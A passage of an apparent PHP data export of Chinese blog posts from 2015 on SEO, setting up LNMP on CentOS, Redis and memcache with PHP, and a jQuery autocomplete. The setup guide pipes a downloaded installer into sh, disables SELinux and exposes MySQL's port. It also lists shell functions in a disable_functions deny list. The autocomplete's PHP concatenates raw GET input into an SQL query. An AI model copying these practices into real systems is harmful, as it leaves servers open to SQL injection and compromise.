	逐一检查友情链接的网站是否被K，或者是被降权。与一个被K或者被降权的站，互通友好，多少会对自己的站有影响。</p><p>
	2、内链不合理</p><p>
	内链就好比现实中一张城市的地图，有了这张地图，你就可以顺畅的访问整个城市了。合理的内链可以使蜘蛛顺畅的，有条理的爬行你的网站;自然读到你网站的内容就多了，索引的内容也就多了!注意：不要把不想干的词做成内链锚文本!</p><p>
	3、网站外链质量和数量</p><p>
	从网站收录角度看，你的外链越多，你的网站被搜索引擎蜘蛛机器人爬行的机会就越多，只有搜索引擎蜘蛛机器人来爬行了，你的网站内容才有可能会被收录。</p><p>
	4、网站打开速度</p><p>
	当一个网站收录量不理想，大家就应该去看看那些页面是不是被搜索引擎蜘蛛机器人浏览过。如果一个页面都没有被搜索引擎爬虫浏览过，是不可能会被收录的。一个网站的收录量没有上去，那SEO流量的提升就会有很大的一个瓶颈。</p><p><br/></p>',
            'keyword' => '网站,收录,速度',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:24:05',
          ),
          35 => 
          array (
            'id' => '50',
            'uid' => '1',
            'title' => '（转）CentOS 6.4安装配置LNMP服务器(Nginx+PHP+MySQL)',
            'content' => '<p>这篇文章主要介绍了CentOS 6.4下配置LNMP服务器的详细步骤，需要的朋友可以参考下</p><p><strong><span style=\\"COLOR: #ff0000\\">准备篇</span></strong></p><p><span style=\\"COLOR: #ff0000\\">1、配置防火墙，开启80端口、3306端口</span><br/>vi /etc/sysconfig/iptables<br/>-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT <span style=\\"COLOR: #0000ff\\">#允许80端口通过防火墙</span><br/>-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT <span style=\\"COLOR: #0000ff\\">#允许3306端口通过防火墙</span></p><p><span style=\\"COLOR: #ff00ff\\">备注：很多网友把这两条规则添加到防火墙配置的最后一行，导致防火墙启动失败，</span></p><p><span style=\\"COLOR: #ff00ff\\">正确的应该是添加到默认的22端口这条规则的下面</span></p><p><span style=\\"COLOR: #ff00ff\\">如下所示：</span><br/>################################ 添加好之后防火墙规则如下所示################################<br/># Firewall configuration written by system-config-firewall<br/># Manual customization of this file is not recommended.<br/>*filter<br/>:INPUT ACCEPT [0:0]<br/>:FORWARD ACCEPT [0:0]<br/>:OUTPUT ACCEPT [0:0]<br/>-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT<br/>-A INPUT -p icmp -j ACCEPT<br/>-A INPUT -i lo -j ACCEPT<br/>-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT<br/><span style=\\"COLOR: #ff00ff\\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br/><span style=\\"COLOR: #ff00ff\\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br/>-A INPUT -j REJECT --reject-with icmp-host-prohibited<br/>-A FORWARD -j REJECT --reject-with icmp-host-prohibited<br/>COMMIT<br/>#######################################################################################<br/>/etc/init.d/iptables restart <span style=\\"COLOR: #0000ff\\">#最后重启防火墙使配置生效</span></p><p><span style=\\"COLOR: #ff0000\\">2、关闭SELINUX</span><br/>vi /etc/selinux/config<br/>#SELINUX=enforcing <span style=\\"COLOR: #0000ff\\">#注释掉</span><br/>#SELINUXTYPE=targeted <span style=\\"COLOR: #0000ff\\">#注释掉</span><br/>SELINUX=disabled<span style=\\"COLOR: #0000ff\\"> #增加</span><br/>:wq <span style=\\"COLOR: #0000ff\\">#保存退出</span><br/>shutdown -r now<span style=\\"COLOR: #0000ff\\"> #重启系统</span></p><p><span style=\\"COLOR: #ff0000\\">3、安装第三方yum源</span></p><p>yum install wget <span style=\\"COLOR: #0000ff\\">#安装下载工具</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1950.jpg\\"/></p><p>wget http://www.atomicorp.com/installers/atomic <span style=\\"COLOR: #0000ff\\">#下载</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1951.jpg\\"/></p><p>sh ./atomic <span style=\\"COLOR: #0000ff\\">#安装</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1953.jpg\\"/></p><p>yum check-update <span style=\\"COLOR: #0000ff\\">#更新yum源</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1954.jpg\\"/></p><p><span style=\\"COLOR: #ff0000\\"><strong>安装篇</strong></span></p><p><span style=\\"COLOR: #ff0000\\">一、安装nginx</span></p><p>yum remove httpd* php* <span style=\\"COLOR: #0000ff\\">#删除系统自带的软件包</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1955.jpg\\"/></p><p>yum install nginx <span style=\\"COLOR: #0000ff\\">#安装nginx 根据提示输入y进行安装</span></p><p>chkconfig nginx on <span style=\\"COLOR: #0000ff\\">#设置nginx开机启动</span></p><p>service nginx start <span style=\\"COLOR: #0000ff\\">#启动nginx</span></p><p><span style=\\"COLOR: #ff0000\\">二、安装MySQL</span></p><p>1、安装MySQL</p><p>yum install mysql mysql-server <span style=\\"COLOR: #0000ff\\">#输入Y即可自动安装,直到安装完成</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1956.jpg\\"/></p><p>/etc/init.d/mysqld start <span style=\\"COLOR: #0000ff\\">#启动MySQL</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1957.jpg\\"/></p><p>chkconfig mysqld on <span style=\\"COLOR: #0000ff\\">#设为开机启动</span></p><p>cp /usr/share/mysql/my-medium.cnf /etc/my.cnf <span style=\\"COLOR: #0000ff\\">#拷贝配置文件（注意：如果/etc目录下面默认有一个my.cnf，直接覆盖即可）</span></p><p>2、为root账户设置密码</p><p>mysql_secure_installation</p><p><span style=\\"COLOR: #0000ff\\">#回车，根据提示输入Y，输入2次密码，回车，根据提示一路输入Y，最后出现：Thanks for using MySQL!</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1958.jpg\\"/></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1959.jpg\\"/></p><p>MySql密码设置完成，重新启动 MySQL：</p><p>/etc/init.d/mysqld restart <span style=\\"COLOR: #0000ff\\">#重启</span></p><p>/etc/init.d/mysqld stop <span style=\\"COLOR: #0000ff\\">#停止</span></p><p>/etc/init.d/mysqld start <span style=\\"COLOR: #0000ff\\">#启动</span></p><p><span style=\\"COLOR: #ff0000\\">三、安装PHP5</span></p><p>1、安装PHP5</p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1960.jpg\\"/></p><p>yum install php php-fpm <span style=\\"COLOR: #0000ff\\">#根据提示输入Y直到安装完成</span></p><p>2、安装PHP组件，使 PHP5 支持 MySQL</p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1961.jpg\\"/></p><p>yum install php-mysql php-gd libjpeg* php-imap php-ldap php-odbc 
php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-bcmath php-mhash
 libmcrypt</p><p><span style=\\"COLOR: #0000ff\\">#这里选择以上安装包进行安装，根据提示输入Y回车</span></p><p>chkconfig php-fpm on <span style=\\"COLOR: #0000ff\\">#设置php-fpm开机启动</span></p><p>/etc/init.d/php-fpm start <span style=\\"COLOR: #0000ff\\">#启动php-fpm</span></p><p><span style=\\"COLOR: #ff0000\\"><strong>配置篇</strong></span></p><p><span style=\\"COLOR: #ff0000\\">一、配置nginx支持php</span><br/>cp /etc/nginx/nginx.conf /etc/nginx/nginx.confbak<span style=\\"COLOR: #0000ff\\">#备份原有配置文件<br/></span>vi /etc/nginx/nginx.conf <span style=\\"COLOR: #0000ff\\">#编辑</span><br/>user nginx nginx; <span style=\\"COLOR: #0000ff\\">#修改nginx运行账号为：nginx组的nginx用户</span><br/>:wq <span style=\\"COLOR: #0000ff\\">#保存退出</span><br/>cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.confbak <span style=\\"COLOR: #0000ff\\">#备份原有配置文件<br/></span>vi /etc/nginx/conf.d/default.conf <span style=\\"COLOR: #0000ff\\">#编辑</span></p><p>index index.php index.html index.htm; <span style=\\"COLOR: #0000ff\\">#增加index.php</span></p><p># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000<br/>#<br/>location ~ \\\\.php$ {<br/>root html;<br/>fastcgi_pass 127.0.0.1:9000;<br/>fastcgi_index index.php;<br/>fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br/>include fastcgi_params;<br/>}<br/><span style=\\"COLOR: #0000ff\\">#取消FastCGI server部分location的注释,并要注意fastcgi_param行的参数,改为$document_root$fastcgi_script_name,或者使用绝对路径</span><br/>service nginx restart <span style=\\"COLOR: #0000ff\\">#重启nginx</span></p><p><span style=\\"COLOR: #ff0000\\">二、php配置</span><br/>vi /etc/php.ini <span style=\\"COLOR: #0000ff\\">#编辑</span><br/>date.timezone = PRC <span style=\\"COLOR: #0000ff\\">#在946行 把前面的分号去掉，改为date.timezone = PRC</span><br/>disable_functions =</p><p>passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,ope</p><p>nlog,syslog,readlink,symlink,popepassthru,stream_socket_server,escapeshellcmd,dll,popen,disk_free_space,checkdnsrr,checkdns</p><p>rr,getservbyname,getservbyport,disk_total_space,posix_ctermid,posix_get_last_error,posix_getcwd,</p><p>posix_getegid,posix_geteuid,posix_getgid,</p><p>posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,</p><p>posix_getppid,posix_getpwnam,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty,</p><p>posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,</p><p>posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname<br/><span style=\\"COLOR: #0000ff\\">#在386行 列出PHP可以禁用的函数，如果某些程序需要用到这个函数，可以删除，取消禁用。</span><br/>expose_php = Off <span style=\\"COLOR: #0000ff\\">#在432行 禁止显示php版本的信息</span><br/>magic_quotes_gpc = On <span style=\\"COLOR: #0000ff\\">#在745行 打开magic_quotes_gpc来防止SQL注入</span><br/>short_open_tag = ON <span style=\\"COLOR: #0000ff\\">#在229行支持php短标签</span><br/>open_basedir = .:/tmp/ <span style=\\"COLOR: #0000ff\\">#在380行 设置表示允许访问当前目录(即PHP脚本文件所在之目录)和/tmp/目录,可以防止php木马跨站,如果改了之后安装程序有问题(<span style=\\"COLOR: #ff00ff\\">例如：织梦内容管理系统</span>)，可以注销此行，或者直接写上程序的目录/data/www.osyunwei.com/:/tmp/</span><br/>:wq! <span style=\\"COLOR: #0000ff\\">#保存退出</span></p><p><span style=\\"COLOR: #ff0000\\">三、配置php-fpm</span><br/>cp /etc/php-fpm.d/www.conf /etc/php-fpm.d/www.confbak <span style=\\"COLOR: #0000ff\\">#备份原有配置文件</span><br/>vi /etc/php-fpm.d/www.conf <span style=\\"COLOR: #0000ff\\">#编辑</span><br/>user = nginx <span style=\\"COLOR: #0000ff\\">#修改用户为nginx</span><br/>group = nginx <span style=\\"COLOR: #0000ff\\">#修改组为nginx</span><br/><span style=\\"COLOR: #000000\\">:wq <span style=\\"COLOR: #0000ff\\">#保存退出</span></span></p><p><span style=\\"COLOR: #ff0000\\"><strong>测试篇</strong></span></p><p>cd /usr/share/nginx/html</p><p>vi index.php <span style=\\"COLOR: #0000ff\\">#添加以下代码</span><br/>&lt;?php<br/>phpinfo();<br/>?&gt;</p><p>:wq! <span style=\\"COLOR: #0000ff\\">#保存退出</span></p><p>chown nginx.nginx /usr/share/nginx/html -R <span style=\\"COLOR: #0000ff\\">#设置权限</span></p><p>service nginx restart <span style=\\"COLOR: #0000ff\\">#重启nginx</span></p><p>service php-fpm restart <span style=\\"COLOR: #0000ff\\">#重启php-fpm</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1962.jpg\\"/></p><p><span style=\\"COLOR: #ff0000\\">在客户端浏览器输入服务器IP地址，可以看到相关的配置信息！</span></p><p><span style=\\"COLOR: #ff0000\\">说明lnmp配置成功！</span></p><p><img alt=\\"\\" src=\\"http://files.jb51.net/file_images/article/201303/1963.jpg\\"/></p><p><strong><span style=\\"COLOR: #ff0000\\">至此，CnetOS 6.4安装配置LNMP（Nginx+PHP+MySQL）教程完成。</span></strong></p><p>文章转自：http://www.jb51.net/article/37986.htm</p>',
            'keyword' => 'CentOS,LNMP',
            'sortid' => '5',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:22:54',
          ),
          36 => 
          array (
            'id' => '49',
            'uid' => '1',
            'title' => 'Windows下安装redis缓存与PHP的使用',
            'content' => '<ol class=\\"\\\\&quot; list-paddingleft-2\\"><li><p>下载redis客户端</p><p>下载地址<a href=\\"\\\\&quot;https://github.com/dmajkic/redis/downloads\\\\&quot;\\" target=\\"\\\\&quot;_blank\\\\&quot;\\" data-mce-href=\\"\\\\&quot;https://github.com/dmajkic/redis/downloads\\\\&quot;\\">https://github.com/dmajkic/redis/downloads</a>。下载到的Redis支持32bit和64bit。根据自己实际情况选择。把文件内容拷贝到需要安装的目录下,比如：D:\\\\\\\\dev\\\\\\\\redis-2.4.5。</p><p><br/></p><p>打开一个cmd窗口，使用cd命令切换到指定目录（D:\\\\\\\\dev\\\\\\\\redis-2.4.5）运行&nbsp;redis-server.exe redis.conf&nbsp;。运行以后出现如下界面。</p><p><img src=\\"/public/upload/image/20150921/1442814218695694.png\\" title=\\"1442814218695694.png\\" alt=\\"127152838-1d64c3178a504a1dab2c48e270703104.png\\"/><br/></p><p>这就说明Redis服务端已经安装成功。</p><p><br/></p></li><li><p>重新打开一个cmd窗口，使用cd命令切换到指定目录（D:\\\\\\\\dev\\\\\\\\redis-2.4.5）运行&nbsp;redis-cli.exe -h 
127.0.0.1 -p 6379，其中 127.0.0.1是本地ip，6379是redis服务端的默认端口。运行成功如下图所示。</p><p><img src=\\"/public/upload/image/20150921/1442814248127223.png\\" title=\\"1442814248127223.png\\" alt=\\"227152846-f394a6eb01ad41ba92989d571f34d211.png\\"/><br/></p><p>这样，Redis windows环境下搭建已经完成，是不是很简单。</p><p><br/></p></li><li><p>环境已经搭建好，总得测试下吧。比如：存储一个key为test，value为hello word的字符串，然后获取key值。</p><p><img src=\\"/public/upload/image/20150921/1442814267427004.png\\" title=\\"1442814267427004.png\\" alt=\\"327152856-ead450e5a5dd408f957012d219bf0247.png\\"/><br/></p><p>正确输出 hell word，测试成功！</p><p><br/></p></li><li><p><strong>PHP中使用</strong></p><p>1 添加phpredis扩展</p><p>&nbsp;首先，查看所用php编译版本V6/V9 在phpinfo()中查看</p><p>&nbsp;<img src=\\"/public/upload/image/20150921/1442814291820400.jpg\\" title=\\"1442814291820400.jpg\\" alt=\\"405eba02c-ce36-32af-88d8-8c53856ea927.jpg\\"/></p><p><br/></p><p>2 下载扩展 地址：<a href=\\"\\\\&quot;https://github.com/nicolasff/phpredis/downloads\\\\&quot;\\" target=\\"\\\\&quot;_blank\\\\&quot;\\" data-mce-href=\\"\\\\&quot;https://github.com/nicolasff/phpredis/downloads\\\\&quot;\\">https://github.com/nicolasff/phpredis/downloads</a>（注意所支持的php版本）</p><p>&nbsp;</p><p>3&nbsp;首先把php_redis.dll 和 php_igbinary.dll 放入PHP的ext文件夹，然后在php.ini配置文件里添加如下代码：</p><p>extension=php_igbinary.dll</p><p>extension=php_redis.dll</p><p>注意：extension=php_igbinary.dll一定要放在extension=php_redis.dll的前面，否则此扩展不会生效&nbsp;</p><p>&nbsp;</p><p>4 重新启动服务，查看phpinfo(),下面表示成功；&nbsp;</p><p><br/></p></li></ol><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src=\\"/public/upload/image/20150921/1442814308119107.jpg\\" title=\\"1442814308119107.jpg\\" alt=\\"55c2af525-b89e-35bb-9bd5-996c1ffc10a2.jpg\\"/></p><p><br/></p><p>&nbsp; &nbsp;5 用PHP测试</p><p>&nbsp; &nbsp; &nbsp;Php代码 &nbsp;<a title=\\"\\\\&quot;收藏这段代码\\\\&quot;\\"><img class=\\"\\\\&quot;star\\\\&quot;\\" src=\\"\\\\&quot;http://alfred-long.iteye.com/images/icon_star.png\\\\&quot;\\" alt=\\"\\\\&quot;收藏代码\\\\&quot;\\" data-mce-src=\\"\\\\&quot;http://alfred-long.iteye.com/images/icon_star.png\\\\&quot;/\\"/></a><br data-mce-bogus=\\"\\\\&quot;1\\\\&quot;/\\"/></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$redis&nbsp;=&nbsp;<span class=\\"\\\\&quot;keyword\\\\&quot;\\">new&nbsp;Redis();&nbsp;&nbsp;</span></span></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$redis-&gt;connect(<span class=\\"\\\\&quot;string\\\\&quot;\\">&quot;192.168.138.2&quot;,<span class=\\"\\\\&quot;string\\\\&quot;\\">&quot;6379&quot;);&nbsp;&nbsp;<span class=\\"\\\\&quot;comment\\\\&quot;\\">//php客户端设置的ip及端口&nbsp;&nbsp;</span></span></span></span></p><p><span class=\\"\\\\&quot;comment\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;//存储一个&nbsp;值&nbsp;&nbsp;</span></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$redis-&gt;set(<span class=\\"\\\\&quot;string\\\\&quot;\\">&quot;say&quot;,<span class=\\"\\\\&quot;string\\\\&quot;\\">&quot;Hello&nbsp;World&quot;);&nbsp;&nbsp;</span></span></span></p><p><span class=\\"\\\\&quot;func\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;<span class=\\"\\\\&quot;vars\\\\&quot;\\">$redis-&gt;get(<span class=\\"\\\\&quot;string\\\\&quot;\\">&quot;say&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\\"\\\\&quot;comment\\\\&quot;\\">//应输出Hello&nbsp;World&nbsp;&nbsp;</span></span></span></span></p><p>&nbsp;&nbsp;</p><p><span class=\\"\\\\&quot;comment\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;//存储多个值&nbsp;&nbsp;</span></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$array&nbsp;=&nbsp;<span class=\\"\\\\&quot;keyword\\\\&quot;\\">array(<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;first_key&#39;=&gt;<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;first_val&#39;,&nbsp;&nbsp;</span></span></span></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;second_key&#39;=&gt;<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;second_val&#39;,&nbsp;&nbsp;</span></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;third_key&#39;=&gt;<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;third_val&#39;);&nbsp;&nbsp;</span></span></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$array_get&nbsp;=&nbsp;<span class=\\"\\\\&quot;keyword\\\\&quot;\\">array(<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;first_key&#39;,<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;second_key&#39;,<span class=\\"\\\\&quot;string\\\\&quot;\\">&#39;third_key&#39;);&nbsp;&nbsp;</span></span></span></span></span></p><p><span class=\\"\\\\&quot;vars\\\\&quot;\\">&nbsp;&nbsp;&nbsp;&nbsp;$redis-&gt;mset(<span class=\\"\\\\&quot;vars\\\\&quot;\\">$array);&nbsp;&nbsp;</span></span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;var_dump(<span class=\\"\\\\&quot;vars\\\\&quot;\\">$redis-&gt;mget(<span class=\\"\\\\&quot;vars\\\\&quot;\\">$array_get));&nbsp; <br/></span></span></p><p><br/></p>',
            'keyword' => 'Windows,redis,缓存',
            'sortid' => '6',
            'img' => '',
            'views' => '9',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:32:40',
          ),
          37 => 
          array (
            'id' => '48',
            'uid' => '1',
            'title' => 'windwos下安装php的memcache缓存扩展',
            'content' => '<p><strong>1.首先下载memcache的windows版</strong></p><p>(下载地址：<a href=\\"http://www.splinedancer.com/memcached-win32/memcached-1.2.4-Win32-Preview-20080309_bin.zip\\" target=\\"_blank\\">http://www.splinedancer.com/memcached-win32/memcached-1.2.4-Win32-Preview-20080309_bin.zip</a>)<br/>到 memcache 官网去下载 windows 下的 memcache.exe 这个程序</p><p></p><p>　　然后把他放在 d:\\\\memcache 目录下</p><p>　　打开 cmd 命令 输入</p><p>　　cd d:\\\\memcache</p><p><br/></p><p><strong>2.安装<br/></strong>memcache.exe -d install</p><p><strong>安装完成后<br/></strong>memcache.exe -d start</p><p><br/></p><p><strong>成功开启 memcache后</strong></p><p>就到 php/ext 目录下 把 php_memcache.dll 放到里面</p><p>然后在 php 目录下的 php.ini 增加一段内容<br/>extension=php_memcache.dll</p><p>加完之后，重启 apache</p><p>然后 在php页面输出phpinfo();</p><p>检查 memcache 是否成功加载了。</p><p><br/></p><p><strong>如果成功加载了 ，就可以 在一个php页面做 memcache测试了</strong></p><p>&lt;?php<br/>//phpinfo();</p><p>$memcache = new Memcache;<br/>$memcache-&gt;connect(&#39;127.0.0.1&#39;,11211) or die(&#39;shit&#39;);</p><p>$memcache-&gt;set(&#39;key&#39;,&#39;hello memcache!&#39;);</p><p>$out = $memcache-&gt;get(&#39;key&#39;);</p><p>echo $out;</p><p><strong>成功的话会输出 </strong></p><p>hello memcache!</p><p>&nbsp;</p><p>注意这样安装之后memcached将作为windows的一个服务每次开机时自动启动。这样服务器端已经安装完毕了。</p><p>卸载则输入：&quot;d:\\\\software\\\\memcached-1.2.4\\\\memcached.exe -d stop&quot; 停止服务，<br/>“d:\\\\software\\\\memcached-1.2.4\\\\memcached.exe -d
uninstall”卸载服务。</p><p><br/></p>',
            'keyword' => 'windwos,memcache,缓存',
            'sortid' => '6',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:31:36',
          ),
          38 => 
          array (
            'id' => '47',
            'uid' => '1',
            'title' => 'jquery ajax 实现文本框自动完成效果',
            'content' => '<p>HTML部分：</p><p>index.html文件内容</p><pre class=\\"brush:html;toolbar:false\\">&lt;!DOCTYPE&nbsp;html&nbsp;PUBLIC&nbsp;&quot;-//W3C//DTD&nbsp;XHTML&nbsp;1.0&nbsp;Transitional//EN&quot;&nbsp;&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
&lt;html&nbsp;xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;http-equiv=&quot;Content-Type&quot;&nbsp;content=&quot;text/html;&nbsp;charset=utf-8&quot;&nbsp;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;jquery+ajax自动补全&lt;/title&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;jquery-1.8.3.min.js&quot;&gt;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&nbsp;src=&quot;auto.js&quot;&gt;&lt;/script&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;style&nbsp;type=&quot;text/css&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;body{&nbsp;font-family:Arial;font-size:14px;&nbsp;padding:0px;&nbsp;margin:10px;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.search_word{&nbsp;width:200px;&nbsp;}/*&nbsp;用户输入框的样式&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.show{border:1px&nbsp;solid&nbsp;#004a7e;}/*&nbsp;显示提示框的边框&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ul{list-style:none;&nbsp;margin:0px;&nbsp;padding:0px;&nbsp;color:#004a7e;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.mouseOver{&nbsp;background-color:#004a7e;color:#FFFFFF;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/style&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/head&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;body&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;text&quot;&nbsp;id=&quot;search_word&quot;&nbsp;class=&quot;search_word&quot;&nbsp;size=&quot;40&quot;&nbsp;maxlength=&quot;40&quot;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;button&quot;&nbsp;name=&quot;sub&quot;&nbsp;value=&quot;提交&quot;/&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;search_div&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&nbsp;id=&quot;search_ul&quot;&gt;&lt;/ul&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/body&gt;
&lt;/html&gt;</pre><p>PHP部分代码：</p><p>search.php文件</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php

&nbsp;&nbsp;&nbsp;&nbsp;//
&nbsp;&nbsp;&nbsp;&nbsp;$link&nbsp;=&nbsp;@mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;)&nbsp;or&nbsp;die&nbsp;(&quot;数据库连接错误&quot;.mysql_error());
&nbsp;&nbsp;&nbsp;&nbsp;mysql_select_db(&quot;mywebsite&quot;,$link)or&nbsp;die&nbsp;(&quot;数据库连接错误&quot;.mysql_error());
&nbsp;&nbsp;&nbsp;&nbsp;mysql_query(&quot;set&nbsp;names&nbsp;&#39;utf8&#39;&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;//
&nbsp;&nbsp;&nbsp;&nbsp;$search_word&nbsp;=&nbsp;$_GET[&#39;search_word&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$str&nbsp;=&nbsp;&quot;select&nbsp;*&nbsp;from&nbsp;auto&nbsp;where&nbsp;keyword&nbsp;LIKE&nbsp;&#39;%&quot;.$search_word.&quot;%&#39;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;mysql_query($str);
&nbsp;&nbsp;&nbsp;&nbsp;while($row&nbsp;=&nbsp;mysql_fetch_array($result)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$keyword[]&nbsp;=&nbsp;$row[&#39;keyword&#39;];
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;json_encode($keyword);
?&gt;</pre><p>js文件部分代码：</p><p>auto.js文件</p><pre class=\\"brush:js;toolbar:false\\">$(function(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//初始化变量
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;li_index&nbsp;=&nbsp;-1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//li索引值
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;search_word&nbsp;=&nbsp;$(&quot;#search_word&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;search_div&nbsp;=&nbsp;$(&quot;#search_div&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;search_ul&nbsp;=&nbsp;$(&quot;#search_ul&quot;);
